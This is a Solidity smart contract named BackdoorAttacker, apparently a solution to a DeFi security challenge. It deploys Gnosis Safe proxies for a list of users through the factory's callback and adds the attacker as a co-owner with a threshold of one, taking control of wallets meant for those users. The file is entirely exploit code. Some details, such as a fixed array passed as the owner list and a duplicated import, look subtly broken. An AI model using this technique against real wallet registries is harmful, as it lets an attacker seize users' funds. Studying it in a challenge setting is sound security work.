// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker is Ownable {
    event ProxyCreated(address proxy);

    constructor(
        GnosisSafe masterCopy,
        GnosisSafeProxyFactory proxyFactory,
        IProxyCreationCallback callback,
        address[] memory users
    ) payable {
        _initializeOwner(msg.sender);

        for (uint256 i = 0; i < users.length; i++) {
            createProxy(masterCopy, proxyFactory, callback, users[i], i);
        }
    }

    function createProxy(
        GnosisSafe masterCopy,
        GnosisSafeProxyFactory proxyFactory,
        IProxyCreationCallback callback,
        address user,
        uint256 salt
    ) private {
        address proxy = address(
            proxyFactory.createProxyWithCallback(
                address(masterCopy),
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    [user, msg.sender],
                    1,
                    address(0),
                    bytes("0x"),
                    address(0),
                    address(0),
                    0,
                    address(0)
                ),
                salt,
                callback
            )
        );

        emit ProxyCreated(proxy);
    }
}
